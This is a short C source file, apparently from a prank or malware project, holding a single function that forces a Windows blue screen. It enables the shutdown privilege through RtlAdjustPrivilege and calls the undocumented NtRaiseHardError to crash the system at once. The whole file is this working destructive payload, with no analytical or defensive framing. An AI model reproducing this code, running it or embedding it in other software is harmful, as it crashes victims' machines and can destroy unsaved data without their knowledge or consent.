#include"GFucker.h"

void realBSOD()		//real bluescreen
{
	HMODULE ntdll = LoadLibraryA("ntdll");
	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll,"RtlAdjustPrivilege");
	FARPROC NtRaiseHardError = GetProcAddress(ntdll,"NtRaiseHardError");
	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL)
	{
		BOOLEAN t1; DWORD t2;
		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &t1);
		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &t2);
	}
}